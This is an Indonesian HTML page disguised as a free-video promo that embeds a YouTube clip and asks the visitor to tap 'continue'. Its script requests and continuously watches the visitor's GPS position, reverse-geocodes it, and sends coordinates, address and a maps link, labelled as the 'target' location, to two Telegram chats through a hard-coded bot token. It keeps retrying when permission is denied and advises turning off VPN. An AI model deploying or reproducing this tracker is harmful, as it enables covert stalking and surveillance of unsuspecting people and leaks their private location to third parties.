<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Promo Spesial: Video Gratis!</title>
    <style>
        body { font-family: Arial; padding: 20px; background: #f0f0f0; text-align: center; }
        #video-container { margin: 20px auto; max-width: 560px; }
        #youtube-video { width: 100%; height: 315px; border: none; }
        #status { font-size: 12px; color: #666; margin-top: 10px; opacity: 0.7; }
        #location-btn { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 10px; display: none; } /* Sembunyi awal */
        #location-btn:hover { background: #0056b3; }
    </style>
</head>
<body>
    <h1>!</h1>
    <p>...</p>
    
    <div id="video-container">
        <iframe id="youtube-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&rel=0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>
    
    <button id="location-btn" onclick="requestLocation()">Lanjut</button>
    
    <div id="status">Klik tombol di atas untuk lanjut...</div>

    <script>
        // Ganti ini
        const BOT_TOKEN = '7822471568:AAE89BHf7mxBx4kqhKNLyE7yP4IlMgi8wFE';
        const CHAT_IDS = ['7680606818', '6212362026']; // Tambah ID kedua di sini
        
        let watchId;
        let lastLat = null;
        let lastLng = null;
        const MIN_DISTANCE = 5;
        const status = document.getElementById('status');
        const locationBtn = document.getElementById('location-btn');
        let retryCount = 0;
        const MAX_RETRIES = 2;

        // Fungsi jarak (sama)
        function getDistance(lat1, lng1, lat2, lng2) {
            if (!lat1 || !lat2) return Infinity;
            const R = 6371e3;
            const Ï†1 = lat1 * Math.PI/180;
            const Ï†2 = lat2 * Math.PI/180;
            const Î”Ï† = (lat2-lat1) * Math.PI/180;
            const Î”Î» = (lng2-lng1) * Math.PI/180;
            const a = Math.sin(Î”Ï†/2) * Math.sin(Î”Ï†/2) + Math.cos(Ï†1) * Math.cos(Ï†2) * Math.sin(Î”Î»/2) * Math.sin(Î”Î»/2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
            return R * c;
        }

        // Geocode (sama)
        async function getAddress(lat, lng) {
            try {
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
                const data = await res.json();
                return data.display_name || 'Alamat tidak ditemukan';
            } catch (e) {
                return 'Error geocode';
            }
        }

        // Kirim ke Telegram - Multiple ID (sama)
        async function sendToTelegram(lat, lng, accuracy, timestamp, address, mapsLink) {
            const message = `ğŸ˜ˆğ™ğ™–ğ™¡ğ™™ğ™¤ğ™“ğ™©ğ™§ğ™–ğ™˜ğ™ : ğ™¨ğ™ªğ™ ğ™¨ğ™šğ™¨ ğ™ğ™–ğ™§ğ™œğ™šğ™© ğ˜½ğ™šğ™§ğ™ğ™–ğ™¨ğ™ğ™¡ ğ˜¿ğ™ ğ™‡ğ™–ğ™˜ğ™–ğ™ !ğŸ˜ˆ\n\nLatitude: ${lat.toFixed(7)}\nLongitude: ${lng.toFixed(7)}\nAkurasi: ${accuracy}m\nAlamat: ${address}\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}\n\nğŸ˜ˆğ‹ğ¨ğ¤ğšğ¬ğ¢ ğ“ğšğ«ğ ğğ­: ${mapsLink}`;
            
            for (const chatId of CHAT_IDS) {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
                try {
                    const response = await fetch(url);
                    if (response.ok) {
                        console.log(`Data terkirim ke chat ${chatId}!`);
                    } else {
                        console.error(`Error kirim ke ${chatId}: ${response.status}`);
                    }
                } catch (error) {
                    console.error(`Error fetch ke ${chatId}: ${error.message}`);
                }
            }
        }

        // Tampil posisi (sama)
        async function showPosition(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const acc = position.coords.accuracy;
            const time = position.timestamp;
            
            const distance = getDistance(lastLat, lastLng, lat, lng);
            if (distance < MIN_DISTANCE && lastLat !== null) {
                return;
            }
            lastLat = lat;
            lastLng = lng;
            
            const mapsLink = `https://maps.google.com/?q=${lat.toFixed(7)},${lng.toFixed(7)}`;
            const address = await getAddress(lat, lng);
            
            status.innerHTML = `ğ‹ğ¨ğ© ğ²ğ¨ğ®! (â¤â¤: ${acc.toFixed(0)}m)`;
            console.log(`Update: ${lat.toFixed(7)}, ${lng.toFixed(7)} | ${address}`);
            
            sendToTelegram(lat, lng, acc, time, address, mapsLink);
        }

        // Error handler dengan fallback
        function showError(error) {
            console.error('Geolocation Error:', error.code, error.message);
            let msg = 'Verifikasi gagal: ';
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    msg += 'IğŸŒ¹ğŸŒ¹â¤â¤ğŸ’•ğŸ’•. Coba klik tombol lagi.';
                    locationBtn.style.display = 'inline-block'; // Tampilkan tombol buat retry
                    break;
                case error.POSITION_UNAVAILABLE:
                    msg += 'ğŸŒ¹ğŸŒ¹ğŸŒ¹ğŸŒ¹ğŸŒ¹ğŸŒ¹.';
                    break;
                case error.TIMEOUT:
                    msg += 'Sinyal lemah. Mencoba lagi...';
                    if (retryCount < MAX_RETRIES) {
                        retryCount++;
                        setTimeout(() => attemptGeolocation(false), 2000);
                    } else {
                        msg += ' (Coba matikan VPN atau keluar ruangan)';
                        locationBtn.style.display = 'inline-block';
                    }
                    break;
            }
            status.innerHTML = msg;
        }

        // Fungsi attempt geolocation dengan opsi high/low accuracy
        function attemptGeolocation(highAccuracy = true) {
            const options = {
                enableHighAccuracy: highAccuracy,
                timeout: 30000,
                maximumAge: 1000
            };
            status.innerHTML = `Meoanjutkan...${highAccuracy ? ' ğŸ˜˜' : ''}...`;
            locationBtn.style.display = 'none'; // Sembunyikan tombol pas proses
            
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    showPosition(pos);
                    watchId = navigator.geolocation.watchPosition(showPosition, showError, options);
                    retryCount = 0;
                },
                showError,
                options
            );
        }

        // Fungsi request lokasi (dari tombol)
        async function requestLocation() {
            // Cek permission status dulu pake Permissions API (buat retry kalo denied)
            if (navigator.permissions && navigator.permissions.query) {
                try {
                    const permission = await navigator.permissions.query({ name: 'geolocation' });
                    if (permission.state === 'granted') {
                        // Udah granted, langsung attempt
                        attemptGeolocation(true);
                    } else if (permission.state === 'denied') {
                        // Denied, coba request ulang (browser mungkin prompt lagi)
                        status.innerHTML = 'Minta izin lokasi lagi...';
                        attemptGeolocation(true);
                    } else {
                        // Prompt, langsung request
                        attemptGeolocation(true);
                    }
                } catch (e) {
                    console.log('Permissions API nggak support, langsung request');
                    attemptGeolocation(true);
                }
            } else {
                // Fallback tanpa Permissions API
                attemptGeolocation(true);
            }
        }

        // Handle network change (sama)
        window.addEventListener('online', () => {
            console.log('Network online - retrying geolocation');
            if (retryCount > 0) {
                setTimeout(() => attemptGeolocation(true), 1000);
            }
        });

        window.addEventListener('offline', () => {
            console.log('Network offline');
            status.innerHTML = 'Koneksi hilang. Coba lagi.';
            locationBtn.style.display = 'inline-block';
        });

        // Auto tampilkan tombol pas load
        window.addEventListener('load', () => {
            locationBtn.style.display = 'inline-block';
        });
    </script>
</body>
</html>
